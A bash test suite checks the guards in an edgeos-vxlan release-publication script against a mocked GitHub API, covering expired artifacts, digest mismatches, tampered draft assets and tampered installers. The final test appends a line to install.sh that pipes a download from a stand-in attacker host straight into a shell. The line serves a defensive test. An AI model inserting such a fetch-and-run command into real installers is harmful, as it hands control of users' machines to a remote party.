#!/bin/bash
# Publication-path adversarial tests.
#
# Drives the real scripts/promote-release.sh publication logic against an
# isolated mocked GitHub API (no network, no real release). Covers the guards
# that run before draft verification: expired candidate artifact, artifact
# digest mismatch, conflicting draft assets, unexpected draft assets, and
# draft resume without clobbering.
#
# Successful publication is NOT exercised here: it requires real Debian
# packages (SBOM re-validation) and real Sigstore attestations. That path is
# covered by the live non-release qualification run.
set -euo pipefail

ROOT=$(cd "$(dirname "$0")/.." && pwd)
# shellcheck source=../scripts/release-common.sh
. "$ROOT/scripts/release-common.sh"
TMP=$(mktemp -d "${TMPDIR:-/tmp}/edgeos-vxlan-publication.XXXXXX")
trap 'rm -rf "$TMP"' EXIT HUP INT TERM
PASS=0
FAIL=0
STATE=$TMP/state
mkdir -p "$STATE/assets"

ok() { PASS=$((PASS + 1)); }
bad()
{
    FAIL=$((FAIL + 1))
    echo "FAIL: $*" >&2
}
expect_fail_with()
{
    local pattern=$1
    shift
    if "$@" >"$TMP/out" 2>"$TMP/err"; then
        bad "expected failure ($pattern): $*"
    elif grep -Fq -- "$pattern" "$TMP/err"; then
        ok
    else
        bad "failed for the wrong reason; wanted '$pattern': $*"
        sed 's/^/    /' "$TMP/err" | tail -10 >&2
    fi
}

VERSION=0.3.1+edgeos3.0.1.e50
TAG=v0.3.1
INTEGRATION="edgeos-vxlan_${VERSION}_all.deb"
KMOD="edgeos-vxlan-kmod_${VERSION}_mipsel.deb"
BUILDINFO="edgeos-vxlan_${VERSION}_mipsel.buildinfo"
CHANGES="edgeos-vxlan_${VERSION}_mipsel.changes"

# --- synthetic A->B source repository ----------------------------------------
REPO=$TMP/repo
mkdir -p "$REPO"/{debian,src,scripts,release,docs,containers/reproducible-build}
printf 'source\n' > "$REPO/src/a"
printf 'build\n' > "$REPO/scripts/build.sh"
printf 'policy\n' > "$REPO/release/release-policy.json"
printf 'Dockerfile\n' > "$REPO/containers/reproducible-build/Dockerfile"
printf 'edgeos-vxlan (%s) unstable; urgency=medium\n\n  * test\n\n -- T <t@example.com>  Thu, 01 Jan 1970 00:00:00 +0000\n' \
    "$VERSION" > "$REPO/debian/changelog"
printf '%s\n' '#!/bin/sh' 'VERSION="0.0.0"' \
    'PKG_VERSION="0.0.0+edgeos3.0.1.e50"' \
    'KMOD_SHA256="0000000000000000000000000000000000000000000000000000000000000000"' \
    'INTEGRATION_SHA256="0000000000000000000000000000000000000000000000000000000000000000"' \
    > "$REPO/install.sh"
: > "$REPO/SHA256SUMS"
git -C "$REPO" init -q
git -C "$REPO" config user.email t@example.com
git -C "$REPO" config user.name T
git -C "$REPO" add .
git -C "$REPO" commit -qm A
A=$(git -C "$REPO" rev-parse HEAD)
A_DIGEST=$("$ROOT/scripts/packaging-inputs.sh" --repo "$REPO" --rev "$A")

# --- candidate artifacts ------------------------------------------------------
CAND=$TMP/candidate
mkdir -p "$CAND"
printf 'integration package\n' > "$CAND/$INTEGRATION"
printf 'kernel package\n' > "$CAND/$KMOD"
printf 'buildinfo\n' > "$CAND/$BUILDINFO"
printf 'changes\n' > "$CAND/$CHANGES"
printf '{"spdxVersion":"SPDX-2.3","SPDXID":"SPDXRef-DOCUMENT","name":"edgeos-vxlan-int","packages":[]}\n' \
    > "$CAND/sbom-edgeos-vxlan.spdx.json"
printf '{"spdxVersion":"SPDX-2.3","SPDXID":"SPDXRef-DOCUMENT","name":"edgeos-vxlan-kmod","packages":[]}\n' \
    > "$CAND/sbom-edgeos-vxlan-kmod.spdx.json"
printf '{"qualified":true}\n' > "$CAND/build-environment-qualification.json"
printf '{"spdxVersion":"SPDX-2.3"}\n' > "$CAND/build-environment-image.spdx.json"

INT_SHA=$(sha256_file "$CAND/$INTEGRATION")
KMOD_SHA=$(sha256_file "$CAND/$KMOD")
# SHA256SUMS is package-only for installer compatibility.
# The pin renderer sorts SHA256SUMS by filename; "edgeos-vxlan-kmod"
# sorts before "edgeos-vxlan_" in the C locale.
printf '%s  %s\n%s  %s\n' "$KMOD_SHA" "$KMOD" "$INT_SHA" "$INTEGRATION" \
    > "$CAND/SHA256SUMS"

# Pin commit B: installer pins and SHA256SUMS only (both excluded from the
# packaging-input digest), then tag it.
sed \
    -e "s|^VERSION=\".*\"$|VERSION=\"0.3.1\"|" \
    -e "s|^PKG_VERSION=\".*\"$|PKG_VERSION=\"$VERSION\"|" \
    -e "s|^KMOD_SHA256=\".*\"$|KMOD_SHA256=\"$KMOD_SHA\"|" \
    -e "s|^INTEGRATION_SHA256=\".*\"$|INTEGRATION_SHA256=\"$INT_SHA\"|" \
    "$REPO/install.sh" > "$TMP/install.new"
mv "$TMP/install.new" "$REPO/install.sh"
# The pin renderer sorts SHA256SUMS by filename; "edgeos-vxlan-kmod"
# sorts before "edgeos-vxlan_" in the C locale.
printf '%s  %s\n%s  %s\n' "$KMOD_SHA" "$KMOD" "$INT_SHA" "$INTEGRATION" \
    > "$REPO/SHA256SUMS"
git -C "$REPO" add install.sh SHA256SUMS
git -C "$REPO" commit -qm B
git -C "$REPO" tag "$TAG"
B=$(git -C "$REPO" rev-parse HEAD)

# --- candidate manifest -------------------------------------------------------
policy_sha=$(sha256_file "$ROOT/release/release-policy.json")
HEX=$(printf 'a%.0s' $(seq 64))
NAMES=$TMP/names.json
jq -n --arg v "$VERSION" '[
  {name:("edgeos-vxlan_"+$v+"_all.deb"), role:"package"},
  {name:("edgeos-vxlan-kmod_"+$v+"_mipsel.deb"), role:"package"},
  {name:("edgeos-vxlan_"+$v+"_mipsel.buildinfo"), role:"debian-metadata"},
  {name:("edgeos-vxlan_"+$v+"_mipsel.changes"), role:"debian-metadata"},
  {name:"sbom-edgeos-vxlan.spdx.json", role:"sbom"},
  {name:"sbom-edgeos-vxlan-kmod.spdx.json", role:"sbom"},
  {name:"build-environment-qualification.json", role:"environment-qualification"}
]' > "$NAMES"

jq -n \
    --arg version "$VERSION" --arg tag "$TAG" --arg commit "$A" \
    --arg hex "$HEX" --arg policy "$policy_sha" --arg digest "$A_DIGEST" \
    --slurpfile names "$NAMES" \
    '{
      schemaVersion:"https://edgeos-vxlan.dev/release-candidate/v1",
      candidate:{id:"",createdAt:"2026-11-27T00:00:00Z",status:"qualified",nonRelease:false},
      project:{name:"edgeos-vxlan",repository:"downwithbgp/edgeos-vxlan",
               repositoryId:1357738281,releaseTag:$tag,packageVersion:$version,
               sourceDateEpoch:1795743000,releasePolicySha256:$policy},
      source:{commit:$commit,archiveSha256:$hex,packagingInputsSha256:$digest,
              trustedWorkflow:{repository:"downwithbgp/edgeos-vxlan",
                               path:".github/workflows/release.yml",
                               ref:"refs/heads/main",commit:$commit}},
      buildEnvironment:{image:("edgeos-vxlan-reproducible@sha256:"+$hex),
              ociIndexDigest:("sha256:"+$hex),manifestDigest:("sha256:"+$hex),
              configDigest:("sha256:"+$hex),ociArchiveSha256:$hex,
              dockerArchiveSha256:$hex,dockerfileSha256:$hex,caBundleSha256:$hex,
              dependencySnapshot:"20261127T000000Z",
              dependencyInventorySha256:$hex,qualificationSha256:$hex,imageSbomSha256:$hex},
      build:{buildType:"type",command:"cmd",
             reproducibility:{status:"passed",comparedArtifacts:["x"]}},
      artifacts:$names[0],
      qualification:{status:"passed",
             checks:[{id:"check",status:"passed",evidenceSha256:$hex}],
             hardware:{status:"not-required",required:false,evidence:[]}},
      limitations:["synthetic publication fixture"]
    }' > "$CAND/release-candidate.json"

# Real sizes/hashes for the artifact files.
entries=""
while IFS=$'\t' read -r name role; do
    [ -n "$name" ] || continue
    entry=$(jq -n --arg name "$name" --arg role "$role" \
        --argjson size "$(stat -c '%s' "$CAND/$name")" \
        --arg sha256 "$(sha256_file "$CAND/$name")" \
        '{name:$name,role:$role,size:$size,sha256:$sha256}')
    entries="${entries}${entries:+,}$entry"
done < <(jq -r '.[] | [.name, .role] | @tsv' "$NAMES")
jq --argjson e "[$entries]" '.artifacts=$e' "$CAND/release-candidate.json" > "$TMP/m1"
mv "$TMP/m1" "$CAND/release-candidate.json"

qsha=$(sha256_file "$CAND/build-environment-qualification.json")
isha=$(sha256_file "$CAND/build-environment-image.spdx.json")
jq --arg q "$qsha" --arg i "$isha" \
    '.buildEnvironment.qualificationSha256=$q | .buildEnvironment.imageSbomSha256=$i' \
    "$CAND/release-candidate.json" > "$TMP/m2"
mv "$TMP/m2" "$CAND/release-candidate.json"

ID=$(candidate_id_from_manifest "$CAND/release-candidate.json")
jq --arg id "$ID" '.candidate.id=$id' "$CAND/release-candidate.json" > "$TMP/m3"
mv "$TMP/m3" "$CAND/release-candidate.json"
MANIFEST_SHA=$(sha256_file "$CAND/release-candidate.json")

# --- attestation bundle with SBOM predicates ---------------------------------
python3 - "$CAND" "$INTEGRATION" "$KMOD" > "$CAND/release-attestation.jsonl" <<'PY'
import base64, json, sys
from hashlib import sha256
from pathlib import Path

cand = Path(sys.argv[1])
out = []
for package, sbom in ((sys.argv[2], "sbom-edgeos-vxlan.spdx.json"),
                      (sys.argv[3], "sbom-edgeos-vxlan-kmod.spdx.json")):
    digest = sha256((cand / package).read_bytes()).hexdigest()
    statement = {
        "_type": "https://in-toto.io/Statement/v1",
        "subject": [{"name": package, "digest": {"sha256": digest}}],
        "predicateType": "https://spdx.dev/Document/v2.3",
        "predicate": json.loads((cand / sbom).read_text()),
    }
    out.append({
        "mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json",
        "dsseEnvelope": {
            "payloadType": "application/vnd.in-toto+json",
            "payload": base64.b64encode(json.dumps(statement).encode()).decode(),
            "signatures": [],
        },
    })
print("\n".join(json.dumps(item) for item in out))
PY

# --- preflight evidence -------------------------------------------------------
ARTIFACT_ID=4242
ARTIFACT_DIGEST="sha256:$(printf 'b%.0s' $(seq 64))"
jq -n --arg tag "$TAG" --arg cid "$ID" --arg msha "$MANIFEST_SHA" \
    --arg aid "$ARTIFACT_ID" --arg adigest "$ARTIFACT_DIGEST" \
    --arg ac "$A" --arg wc "$A" --arg tc "$B" \
    '{schemaVersion:1,candidateId:$cid,manifestSha256:$msha,
      artifactId:$aid,artifactDigest:$adigest,sourceCommit:$ac,
      workflowCommit:$wc,tag:$tag,tagCommit:$tc,
      attestationBundleSha256:"x",assets:[]}' > "$TMP/preflight.json"

# --- isolated mocked GitHub API ----------------------------------------------
FAKE_GH=$TMP/fake-gh
cat > "$FAKE_GH" <<'PY'
#!/usr/bin/env python3
import hashlib, json, os, shutil, sys
from pathlib import Path

state = Path(os.environ["FAKE_GH_STATE"])
releases = state / "releases.json"
if not releases.exists():
    releases.write_text("[]")

def load():
    return json.loads(releases.read_text())

def save(data):
    releases.write_text(json.dumps(data))

args = sys.argv[1:]
if args[:2] == ["attestation", "verify"]:
    print('[{"verificationResult":{"signature":{"certificate":'
          '{"sourceRepositoryIdentifier": 1357738281}}}}]')
    sys.exit(0)

if args[:1] == ["api"]:
    # The repo path is the only argument containing "repos/"; flag values
    # such as the Accept header must not be mistaken for it.
    path = next((a for a in args[1:] if "repos/" in a), "")
    if not path:
        sys.exit(1)
    if "/actions/artifacts/" in path:
        digest = os.environ["FAKE_ARTIFACT_DIGEST"]
        expired = os.environ.get("FAKE_EXPIRED", "false")
        print(json.dumps({"id": int(path.rsplit("/", 1)[1]), "name": "release-candidate",
                          "expired": expired == "true", "digest": digest}))
        sys.exit(0)
    if "/releases/assets/" in path:
        asset_id = int(path.rsplit("/", 1)[1])
        for rel in load():
            for asset in rel.get("assets", []):
                if asset["id"] == asset_id:
                    sys.stdout.buffer.write((state / "assets" / str(asset_id)).read_bytes())
                    sys.exit(0)
        sys.exit(1)
    if "/releases/" in path and path.rsplit("/", 1)[-1].isdigit():
        rid = int(path.rsplit("/", 1)[-1])
        for rel in load():
            if rel["id"] == rid:
                if "--jq" in args:
                    print("true" if rel.get("immutable") else "false")
                else:
                    print(json.dumps(rel))
                sys.exit(0)
        sys.exit(1)
    if path.endswith("/releases?per_page=100") or path.endswith("/releases"):
        print(json.dumps(load()))
        sys.exit(0)
    if "/tags" in path:
        # Version eligibility reads existing release tags.
        print("[]")
        sys.exit(0)
    if "/commits/" in path:
        # Tag re-resolution immediately before publication.
        print(json.dumps({"sha": os.environ["FAKE_TAG_COMMIT"]}))
        sys.exit(0)
    sys.exit(1)

if args[:2] == ["release", "create"]:
    data = load()
    data.append({"id": 1, "tag_name": args[2], "draft": True, "immutable": False, "assets": []})
    save(data)
    sys.exit(0)

if args[:2] == ["release", "upload"]:
    path = Path(args[3])
    data = load()
    asset_id = len([a for rel in data for a in rel.get("assets", [])]) + 1
    shutil.copyfile(path, state / "assets" / str(asset_id))
    for rel in data:
        if rel["tag_name"] == args[2]:
            rel.setdefault("assets", []).append({
                "id": asset_id, "name": path.name,
                "size": path.stat().st_size,
                "digest": "sha256:" + hashlib.sha256(path.read_bytes()).hexdigest(),
            })
    save(data)
    sys.exit(0)

sys.stderr.write("unexpected fake-gh call: %s\n" % " ".join(args))
sys.exit(9)
PY
chmod +x "$FAKE_GH"

publish()
{
    # promote-release.sh writes promotion-plan.json into the candidate
    # directory; publication in the real workflow always starts from a freshly
    # fetched artifact, so start each case from the same clean state.
    rm -f "$CAND/promotion-plan.json" "$CAND/promotion-verification.json"
    env GITHUB_ACTIONS=true GITHUB_EVENT_NAME=workflow_dispatch GITHUB_REF=refs/heads/main \
        RELEASE_ENVIRONMENT=release-publication RELEASE_PUBLICATION_ENABLED=true \
        IMMUTABLE_RELEASES_CONFIRMED=true CONFIRM_PUBLISH=PUBLISH \
        FAKE_GH_STATE="$STATE" FAKE_ARTIFACT_DIGEST="${FAKE_ARTIFACT_DIGEST:-$ARTIFACT_DIGEST}" \
        FAKE_EXPIRED="${FAKE_EXPIRED:-false}" FAKE_TAG_COMMIT="${FAKE_TAG_COMMIT:-$B}" \
        GH_BIN="$FAKE_GH" \
        "$ROOT/scripts/promote-release.sh" \
        --candidate-dir "$CAND" --tag "$TAG" --candidate-id "$ID" \
        --manifest-sha256 "$MANIFEST_SHA" --artifact-id "$ARTIFACT_ID" \
        --artifact-digest "$ARTIFACT_DIGEST" --source-root "$REPO" \
        --preflight-file "$TMP/preflight.json" \
        --expected-tag-commit "${EXPECTED_TAG_COMMIT:-$B}" \
        --expected-source-commit "$A" \
        --expected-workflow-commit "$A"
}

# --- state helpers -------------------------------------------------------------
reset_state()
{
    printf '[]\n' > "$STATE/releases.json"
    rm -f "$STATE"/assets/*
}

# write_draft NAME:PATH... — a draft holding exactly the named assets, copied
# from the given sources, all digests and sizes matching the real bytes.
write_draft()
{
    local entries="" id=0 spec name src
    for spec in "$@"; do
        name=${spec%%:*}
        src=${spec#*:}
        id=$((id + 1))
        cp "$src" "$STATE/assets/$id"
        entries="${entries}${entries:+,}$(jq -n --argjson id "$id" --arg name "$name" \
            --argjson size "$(stat -c '%s' "$src")" \
            --arg digest "sha256:$(sha256_file "$src")" \
            '{id:$id,name:$name,size:$size,digest:$digest}')"
    done
    jq -n --arg tag "$TAG" --argjson assets "[$entries]" \
        '[{id:1,tag_name:$tag,draft:true,immutable:false,assets:$assets}]' \
        > "$STATE/releases.json"
}

# The same asset set the publisher expects, taken from the candidate.
candidate_assets()
{
    find "$CAND" -mindepth 1 -maxdepth 1 -type f -printf '%f\n' |
        grep -Fvx 'source.tar' | grep -Fvx 'promotion-plan.json' |
        grep -Fvx 'promotion-verification.json' | LC_ALL=C sort |
        while IFS= read -r name; do printf '%s:%s\n' "$name" "$CAND/$name"; done
}

# --- expired candidate artifact ----------------------------------------------
reset_state
FAKE_EXPIRED=true expect_fail_with "has expired; abandon the release" publish

# --- artifact digest mismatch -------------------------------------------------
reset_state
FAKE_ARTIFACT_DIGEST="sha256:$(printf 'c%.0s' $(seq 64))" \
    expect_fail_with "candidate artifact digest mismatch" publish

# --- draft with a conflicting asset (same name, different bytes) --------------
reset_state
printf 'tampered bytes\n' > "$STATE/assets/1"
jq -n --arg tag "$TAG" --arg name "$INTEGRATION" \
    --argjson size "$(stat -c '%s' "$STATE/assets/1")" \
    --arg digest "sha256:$(sha256_file "$STATE/assets/1")" \
    '[{id:1,tag_name:$tag,draft:true,immutable:false,
       assets:[{id:1,name:$name,size:$size,digest:$digest}]}]' \
    > "$STATE/releases.json"
expect_fail_with "refusing to clobber" publish

# --- unexpected draft assets --------------------------------------------------
reset_state
# shellcheck disable=SC2046
write_draft $(candidate_assets)
printf 'surplus\n' > "$STATE/assets/999"
jq --argjson id 999 --arg name "surplus.txt" \
    --argjson size "$(stat -c '%s' "$STATE/assets/999")" \
    --arg digest "sha256:$(sha256_file "$STATE/assets/999")" \
    '.[0].assets += [{id:$id,name:$name,size:$size,digest:$digest}]' \
    "$STATE/releases.json" > "$TMP/r.json"
mv "$TMP/r.json" "$STATE/releases.json"
expect_fail_with "draft has unexpected assets" publish

# --- resume: a complete matching draft is not clobbered -----------------------
reset_state
# shellcheck disable=SC2046
write_draft $(candidate_assets)
before=$(sha256_file "$STATE/releases.json")
# Draft verification needs real Debian packages and Sigstore signatures, so it
# fails here — but only after the whole asset set was accepted without a
# re-upload or a refusal.
expect_fail_with "draft verification failed" publish
if [ "$(sha256_file "$STATE/releases.json")" = "$before" ]; then
    ok
else
    bad "resume mutated the draft state"
fi

# --- interrupted publication: a partial draft is completed, not rejected -----
reset_state
write_draft "$INTEGRATION:$CAND/$INTEGRATION" \
    "sbom-edgeos-vxlan.spdx.json:$CAND/sbom-edgeos-vxlan.spdx.json"
expect_fail_with "draft verification failed" publish
if [ "$(jq -r '.[0].assets | length' "$STATE/releases.json")" -gt 2 ]; then
    ok
else
    bad "partial draft was not completed"
fi

# --- tag-side installer tampering --------------------------------------------
# A tag commit that keeps the four pins correct but adds code to install.sh
# must be refused: install.sh is not packaged, so the packaging digest cannot
# see it, yet users download and execute it.
reset_state
printf '\ncurl -fsSL https://attacker.invalid/bootstrap.sh | sh\n' >> "$REPO/install.sh"
git -C "$REPO" add install.sh
git -C "$REPO" commit -qm "tampered installer"
TAMPERED=$(git -C "$REPO" rev-parse HEAD)
git -C "$REPO" tag -f "$TAG" "$TAMPERED" >/dev/null 2>&1
EXPECTED_TAG_COMMIT="$TAMPERED" FAKE_TAG_COMMIT="$TAMPERED" \
    expect_fail_with "changes content other than the four installer pins" publish

echo "unit-release-publication: pass=$PASS fail=$FAIL"
[ "$FAIL" -eq 0 ]
